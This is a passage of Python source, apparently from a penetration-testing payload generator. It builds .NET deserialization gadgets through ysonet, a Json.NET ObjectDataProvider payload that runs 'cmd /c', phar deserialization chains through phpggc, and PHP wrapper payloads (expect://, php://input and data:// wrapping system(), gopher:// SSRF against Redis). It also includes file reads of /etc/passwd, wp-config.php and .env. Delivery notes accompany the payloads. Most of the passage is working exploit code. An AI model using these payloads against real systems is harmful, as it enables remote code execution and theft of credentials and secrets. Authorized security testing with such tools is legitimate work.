        for kw, formatter in self.DOTNET_FORMATTER_MAP.items():
            if kw in self.etype.lower():
                return formatter
        return "BinaryFormatter"

    def _run_ysonet(self, formatter: str, gadget: str, command: str) -> str | None:
        try:
            cmd = [
                self.YSONET_PATH,
                "-f", formatter,
                "-g", gadget,
                "-c", command,
                "-o", "base64",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
            return None
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout: {gadget}")
            return None
        except (subprocess.SubprocessError, OSError, UnicodeDecodeError) as e:
            print(f"[!] Could not run ysonet: {e}")
            return None

    def _mutate_dotnet_viewstate(self) -> Mutations:
        results: Mutations = []
        formatter = self._resolve_dotnet_formatter()

        if not os.path.exists(self.YSONET_PATH):
            return [{
                "error": "ysonet not found",
                "hint": f"Download from https://github.com/irsdl/ysonet/releases and place ysonet.exe at: {self.YSONET_PATH}",
                "command": f"ysonet.exe -f {formatter} -g TypeConfuseDelegate -c 'id' -o base64",
            }]

        for gadget in self.DOTNET_GADGETS:
            for cmd in self.DOTNET_TEST_COMMANDS:
                b64 = self._run_ysonet(formatter, gadget, cmd)
                if b64:
                    payload = self._make_payload("dotnet_deser", f"{formatter}/{gadget}", cmd, b64)
                    payload["note"] = "For ViewState, target must have MAC validation disabled or key must be known/leaked"
                    results.append(payload)

        if not results:
            return [{
                "error": "ysonet found but could not execute any gadget",
                "hint": "Check that the .NET runtime/mono is available to run ysonet.exe",
                "command": f"{self.YSONET_PATH} -f {formatter} -g {self.DOTNET_GADGETS[0]} -c 'id' -o base64",
            }]

        return results

    def _mutate_dotnet_jsonnet(self) -> Mutations:
        results: Mutations = []
        for cmd in self.DOTNET_TEST_COMMANDS:
            raw = (
                '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, '
                'Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",'
                '"MethodName":"Start",'
                '"MethodParameters":{"$type":"System.Collections.ObjectModel.ObservableCollection`1'
                '[[System.String, mscorlib]], System.ObjectModel",'
                f'"$values":["cmd","/c {cmd}"]}},'
                '"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
            )
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("jsonnet_typeconfusion", "ObjectDataProvider", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = (
                "Requires target to use TypeNameHandling.All/Objects/Auto with a weakly-typed "
                "property, AND target must run classic .NET Framework (PresentationFramework is "
                "preloaded in its GAC by default). Does NOT work against .NET Core/.NET 5+ "
                "targets — no GAC, WPF assemblies are not bundled unless explicitly referenced."
            )
            results.append(payload)
        return results


    GOPHERUS_PATH = get_tool_path("gopherus")


    WRAPPER_TEST_COMMANDS = TEST_COMMANDS

    def _mutate_wrapper(self) -> Mutations:
        if self.probe == "rce":
            return self._mutate_wrapper_expect()
        if self.probe == "phar_deser":
            return self._mutate_wrapper_phar()
        if self.probe == "ssrf":
            return self._mutate_wrapper_ssrf()
        if self.probe == "php_input":
            return self._mutate_wrapper_php_input()
        if self.probe == "code_inject":
            return self._mutate_wrapper_data()
        if self.probe == "lfi":
            return self._mutate_wrapper_lfi()
        if self.probe == "traversal":
            return self._mutate_wrapper_traversal()
        if self.probe == "stream":
            return self._mutate_wrapper_stream()
        return []

    def _mutate_wrapper_expect(self) -> Mutations:
        results: Mutations = []
        for cmd in self.WRAPPER_TEST_COMMANDS:
            raw = f"expect://{cmd}"
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_expect", "expect://", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = "Requires the 'expect' PHP extension to be enabled on the target"
            results.append(payload)
        return results

    def _mutate_wrapper_phar(self) -> Mutations:
        results: Mutations = []
        chains = self.__resolve_php_chain()

        if not os.path.exists(self.PHPGGC_PATH):
            return [{
                "error": "phpggc not found",
                "hint": f"Place phpggc at: {self.PHPGGC_PATH}",
                "command": f"php phpggc {chains[0]} system id -p phar -o payload.phar",
            }]

        for chain in list(chains)[:3]:
            for ptype in self.PHP_TYPE:
                for cmd in self.TEST_COMMANDS:
                    try:
                        proc = subprocess.run(
                            ["php", self.PHPGGC_PATH, chain, ptype, cmd, "-p", "phar", "-o", "-"],
                            capture_output=True, timeout=15,
                        )
                    except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                        continue

                    if proc.returncode != 0 or not proc.stdout:
                        continue

                    b64 = base64.b64encode(proc.stdout).decode()
                    payload = self._make_payload("wrapper_phar", chain, cmd, b64)
                    payload["note"] = (
                        "Upload this .phar to the target (e.g. via avatar/file upload), then trigger "
                        "deserialization by referencing phar://<uploaded_path>/test.txt in a "
                        "file-operation sink (file_exists, is_file, fopen, etc.)"
                    )
                    results.append(payload)

        if not results:
            return [{
                "error": "phpggc found but could not execute any chain",
                "hint": "Check that 'php' is installed and on PATH (run 'php -version' to verify)",
                "command": f"php {self.PHPGGC_PATH} {chains[0]} system id -p phar -o payload.phar",
            }]

        return results

    _PYTHON2_CANDIDATES = ["python2", "py -2", r"C:\Python27\python.exe"]

    def _find_python2(self) -> list[str] | None:
        for candidate in self._PYTHON2_CANDIDATES:
            cmd = candidate.split()
            try:
                result = subprocess.run(cmd + ["--version"], capture_output=True, timeout=5)
                if result.returncode == 0:
                    return cmd
            except (FileNotFoundError, OSError):
                continue
        return None

    def _mutate_wrapper_ssrf(self) -> Mutations:
        oob_domain = get_oob_domain()
        if oob_domain:
            raw = (
                f"gopher://{oob_domain}:80/_GET /oob-ssrf-check HTTP/1.1%0D%0A"
                f"Host: {oob_domain}%0D%0A%0D%0A"
            )
            b64 = base64.b64encode(raw.encode()).decode()
            canary_payload = self._make_payload("wrapper_ssrf_oob_canary", "gopher/oob-canary", None, b64)
            canary_payload["payload_raw"] = raw
            canary_payload["note"] = f"Blind SSRF confirmation — check {oob_domain}'s interaction log for an inbound connection"
            canary_result: Mutations = [canary_payload]
        else:
            canary_result = []

        python2 = self._find_python2()
        if os.path.exists(self.GOPHERUS_PATH) and python2:
            try:
                proc = subprocess.run(
                    python2 + [self.GOPHERUS_PATH, "--exploit", "redis"],
                    capture_output=True, text=True, timeout=15,
                )
                if proc.returncode == 0 and proc.stdout.strip():
                    raw = proc.stdout.strip()
                    b64 = base64.b64encode(raw.encode()).decode()
                    payload = self._make_payload("wrapper_ssrf_gopher", "gopherus/redis", None, b64)
                    payload["payload_raw"] = raw
                    payload["note"] = "Generated via Gopherus — review before use, may contain destructive Redis commands"
                    return canary_result + [payload]
            except (subprocess.SubprocessError, OSError, UnicodeDecodeError):
                pass

        redis_hosts = list(dict.fromkeys(["127.0.0.1", self._extract_host()]))
        probe_results: Mutations = []
        for h in redis_hosts:
            raw = f"gopher://{h}:6379/_INFO%0D%0A"
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_ssrf_gopher", f"manual/redis-info-probe/{h}", None, b64)
            payload["payload_raw"] = raw
            payload["note"] = (
                "Benign Redis INFO probe (non-destructive) to confirm SSRF reaches an internal Redis instance. "
                "Redis is almost always bound to 127.0.0.1 from the vulnerable server's own point of view, not "
                "the target's public hostname — try 127.0.0.1 first, the target's own host only as a secondary "
                "guess. Gopherus not found — install for richer Redis/Memcached RCE payloads."
            )
            probe_results.append(payload)
        return canary_result + probe_results

    def _mutate_wrapper_php_input(self) -> Mutations:
        results: Mutations = []
        for cmd in self.WRAPPER_TEST_COMMANDS:
            raw = f"<?php system('{cmd}'); ?>"
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_php_input", "php://input", cmd, b64)
            payload["payload_raw"] = raw
            payload["note"] = (
                "Send this as the raw POST body while the vulnerable parameter/include points to php://input"
            )
            results.append(payload)
        return results

    def _mutate_wrapper_data(self) -> Mutations:
        results: Mutations = []
        for cmd in self.WRAPPER_TEST_COMMANDS:
            code = f"<?php system('{cmd}'); ?>"
            data_uri = f"data://text/plain;base64,{base64.b64encode(code.encode()).decode()}"
            b64 = base64.b64encode(data_uri.encode()).decode()
            payload = self._make_payload("wrapper_data", "data://", cmd, b64)
            payload["payload_raw"] = data_uri
            payload["note"] = "Requires the sink to include()/require() the wrapper output as PHP code"
            results.append(payload)
        return results

    SOURCE_DISCLOSURE_FILES = ["index.php", "config.php", "wp-config.php", ".env"]

    def _mutate_wrapper_lfi(self) -> Mutations:
        targets = [
            ("file:///etc/passwd", "Unix credential file"),
            ("file://C:\\Windows\\win.ini", "Windows config file"),
        ]
        for filename in self.SOURCE_DISCLOSURE_FILES:
            targets.append((
                f"php://filter/convert.base64-encode/resource={filename}",
                f"Source code disclosure ({filename})",
            ))
        results: Mutations = []
        for raw, desc in targets:
            b64 = base64.b64encode(raw.encode()).decode()
            payload = self._make_payload("wrapper_lfi", desc, None, b64)
            payload["payload_raw"] = raw
            results.append(payload)
        return results

    def _mutate_wrapper_traversal(self) -> Mutations:
        raw = "glob:///etc/*"
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("wrapper_traversal", "glob://", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = (
            "glob:// only implements directory-listing stream methods — works with opendir()/"
            "readdir()/scandir()/DirectoryIterator sinks, NOT with include()/file_get_contents()/"
            "fopen(). Also only lists matching names, does not read file contents. "
            "Adjust path per target OS."
        )
        return [payload]

    def _mutate_wrapper_stream(self) -> Mutations:
        raw = "php://filter/convert.base64-encode|zlib.deflate/resource=index.php"
        b64 = base64.b64encode(raw.encode()).decode()
        payload = self._make_payload("wrapper_stream", "php://filter (chained)", None, b64)
        payload["payload_raw"] = raw
        payload["note"] = (
            "Multiple filters stacked with '|' inside a single php://filter wrapper (applied "
            "left to right) — the correct way to chain filters. Nesting compress.zlib:// around "
            "a separate php://filter/... URL does NOT work: zlib expects real compressed bytes "
            "following it, not the base64 text that convert.base64-encode produces."
        )
        return [payload]

    def _extract_host(self) -> str:
        url = self.vector.get("url") or ""
        hostname = urlparse(url).hostname
        return hostname or "TARGET_HOST"
